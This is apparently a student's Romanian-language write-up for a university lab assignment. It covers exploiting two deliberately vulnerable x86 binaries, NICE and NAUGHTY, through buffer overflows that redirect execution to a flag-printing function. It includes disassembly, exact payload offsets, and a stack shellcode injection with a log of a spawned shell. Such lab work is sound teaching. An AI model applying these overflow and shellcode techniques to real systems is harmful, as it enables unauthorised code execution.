## Fisierul NICE

### Analiza binarului

Functia vulnerabila se afla la adresa 0x08049329. In aceasta functie, se aloca
spatiu pentru 0x2f9 bytes. Apoi este salvata pe stiva, mai exact la pozitia
ebp-0x1de, adresa unei functii (0x80492c8). Urmeaza apoi o citere de la tasta-
tura. Daca se citesc maxim 0x2f9-0x1de=283 bytes, nu va fi nicio problema. In
schimb daca se citesc mai multi, se va suprascrie adresa functiei salvata pe
stiva si programul va functiona diferit, intruact ulterior, functia de la acea
adresa va fi apelata. Asa cum se poate observa din codul de mai jos, se citesc
0x2f9 bytes, deci adresa acelei functii va putea fi suprascrisa.


 8049329: &nbsp;&nbsp;&nbsp;&nbsp;      55                      push   ebp\
 804932a:       89 e5                   mov    ebp,esp\
 804932c:       81 ec f9 02 00 00       sub    esp,0x2f9\
 8049332:       c7 85 22 fe ff ff c8    mov    DWORD PTR [ebp-0x1de],0x80492c8\
 8049339:       92 04 08 \
 804933c:       89 e2                   mov    edx,esp\
 804933e:       68 f9 02 00 00          push   0x2f9\
 8049343:       52                      push   edx\
 8049344:       6a 00                   push   0x0\
 8049346:       e8 e5 fc ff ff          call   8049030 \<read@plt>\
 804934b:       8b 85 22 fe ff ff       mov    eax,DWORD PTR \[ebp-0x1de]\
 8049351:       ff d0                   call   eax\
 8049353:       c9                      leave  \
 8049354:       c3                      ret    


### Spargerea binarului

Este suficient sa suprascriu adresa acelei functii cu o alta adresa care va
genera mesajul dorit. Aceasta adresa este 0x08049291 deoarece:

- la eticheta print_flag se afla 7 functii (se observa 7 cadre de stiva);
- main-ul contine 4 functii care doar citesc un numar de bytes si inca una
vulnerabila (cea de a patra);
- a doua functie din print_flag este cea la care "se sare", daca nu este
exploatata vulnerabilitatea, programul afisand "All done...";
- ramane astfel o singura functie, avand adresa 8049291, in corpul careia se
poate observa un apel al functiei "puts", care probabil printeaza mesajul
NICE_FLAG{...}.


 8049291:       55                      push   ebp
 8049292:       89 e5                   mov    ebp,esp
 8049294:       6a 04                   push   0x4
 8049296:       68 66 c0 04 08          push   0x804c066
 804929b:       6a 00                   push   0x0
 804929d:       6a 00                   push   0x0
 804929f:       6a 00                   push   0x0
 80492a1:       6a 00                   push   0x0
 80492a3:       e8 c8 fd ff ff          call   8049070 <ptrace@plt>
 80492a8:       83 c4 10                add    esp,0x10
 80492ab:       83 f8 ff                cmp    eax,0xffffffff
 80492ae:       75 07                   jne    80492b7 <print_flag+0x26>
 80492b0:       6a 01                   push   0x1
 80492b2:       e8 99 fd ff ff          call   8049050 <exit@plt>
 80492b7:       e8 99 ff ff ff          call   8049255 <__x86.get_pc_thunk.bx+0x185>
 80492bc:       68 28 c0 04 08          push   0x804c028
 80492c1:       e8 7a fd ff ff          call   8049040 <puts@plt>
 80492c6:       c9                      leave  
 80492c7:       c3                      ret    


Astfel, pentru a sparge binarul, am citit de la tastatura:

- 98 bytes pentru prima functie, intrucat functia executa exact aceasta
operatie;
- 297 bytes pentru a doua, din acelasi motiv;
- 229 bytes pentru a treia, din acelasi motiv;
- 283 bytes pentru a patra la care am adaugat noua adresa, 0x08049291,
scrisa in little endian.



## Fisierul NAUGHTY

### Spargerea binarului

Vulnerabilitatea in acest binar este o functie care citeste pe stiva mai mult
decat se alocase inainte, putand astfel modifica adresa de retur a functiei
apelante. Concret, a patra functie apelata din main, ce are adresa  0x08049362,
aloca 0x1f2 bytes si citeste 0x34d bytes.


 8049362:       55                      push   ebp
 8049363:       89 e5                   mov    ebp,esp
 8049365:       81 ec f2 01 00 00       sub    esp,0x1f2
 804936b:       89 e2                   mov    edx,esp
 804936d:       68 4b 03 00 00          push   0x34b
 8049372:       52                      push   edx
 8049373:       6a 00                   push   0x0
 8049375:       e8 b6 fc ff ff          call   8049030 <read@plt>
 804937a:       81 bd 75 ff ff ff 88    cmp    DWORD PTR [ebp-0x8b],0xbb4488
 8049381:       44 bb 00 
 8049384:       74 07                   je     804938d <print_flag+0xfc>
 8049386:       6a 01                   push   0x1
 8049388:       e8 c3 fc ff ff          call   8049050 <exit@plt>
 804938d:       c9                      leave  
 804938e:       c3                      ret


Pentru a putea sparge binarul, trebuie ca primele 3 functii apelate din main
sa nu treaca de if-ul corespunzator verificarii unui element citit cu o valoare
data in program. Astfel, prima functie din main, cea de la adresa 0x080492de:

- aloca 0x10d bytes si citeste de la ebp-0x10d in sus, 0xcf bytes;
- compara numarul de la ebp-0xb9 cu valoarea 0x3113cc71, iar daca sunt egale se
continua executia programului.


 80492de:       55                      push   ebp
 80492df:       89 e5                   mov    ebp,esp
 80492e1:       81 ec 0d 01 00 00       sub    esp,0x10d
 80492e7:       89 e2                   mov    edx,esp
 80492e9:       68 cf 00 00 00          push   0xcf
 80492ee:       52                      push   edx
 80492ef:       6a 00                   push   0x0
 80492f1:       e8 3a fd ff ff          call   8049030 <read@plt>
 80492f6:       81 bd 47 ff ff ff 71    cmp    DWORD PTR [ebp-0xb9],0x3113cc71
 80492fd:       cc 13 31 
 8049300:       74 07                   je     8049309 <print_flag+0x78>
 8049302:       6a 01                   push   0x1
 8049304:       e8 47 fd ff ff          call   8049050 <exit@plt>
 8049309:       c9                      leave  
 804930a:       c3                      ret


Deci trebuie avut grija cand citesc de la tastatura, sa introduc 0x10d-0xb9=84
bytes random, apoi numarul 0x3113cc71, in little endian si apoi inca 0xcf-84-4=119
bytes random pentru a continua executia programului.

Pentru urmatoarele doua functii se procedeaza identic.

Pentru a patra functie, unde se citeste mai mult decat se aloca, se citeste prac-
tic intreg numarul de bytes alocat si anume 0x1f2 bytes, avand grija ca mai sus
sa pun numarul corect pe pozitia indicata, iar apoi se citesc inca 4 bytes random
pentru a suprascrie vechiul ebp salvat pe stiva. In final se citeste de la tasta-
tura noua adresa a functiei la care "va sari" executia programului. Practic se
pune adresa 0x08049291, scrisa desigur in little endian, explicatia fiind simi-
lara cu cea din binarul NICE.

In acest fel, functia la care se trece va afisa mesajul "NAUGHTY_FLAG{...}".



### Shellcode

Folosind din nou binarul NAUGHTY, exploatam vulnerabilitatea prezentata anterior
din a patra functie. Ideea este ca in loc sa citim o gramada de caractere
garbage, la un moment dat sa citim codul unei functii care deschide un shell.

Asadar, am dat ca input pentru functia respectiva:
- 100 caractere garbage;
- un string in hexa de 55 bytes care reprezinta codul unei functii ce deschide
un shell (luat de la urmatorul [link](http://shell-storm.org/shellcode/files/shellcode-811.php))
- inca 204 caractere garbage;
- numarul "\x88\x44\xbb\x00", pentru a trece de if-ul care compara valoarea de
la pozitia la care am ajuns cu acest numar;
- inca 139 de caractere garbage astfel incat sa suprasciu tot pana la vechiul
ebp salvat, urmand sa suprascriu si adresa de return;
- "\x7a\xd0\xff\xff", noua adresa de return, care reprezinta de fapt adresa la
care este stocat shellcode-ul citit anterior de la tastatura.

Aceasta noua adresa de return se gaseste cu ajutorul gdb-ului, astfel ca aflu
la ce adresa pointeaza ebp-ul si adun 100, pentru ca am, inainte de citirea
shellcode-ului, am citit 100 bytes garbage. Astfel, obtin adresa de pe stiva la
care este salvat shellcode-ul.

#### Exemplu de rulare

student@IOCLA:~/tema4$ ./naughty < naughty_shellcode 
\$ ls
README	naughty  naughty_payload  naughty_shellcode  nice  nice_payload  tema4.zip
\$ pwd
/home/student/tema4
\$ exit
student@IOCLA:~/tema4$ 


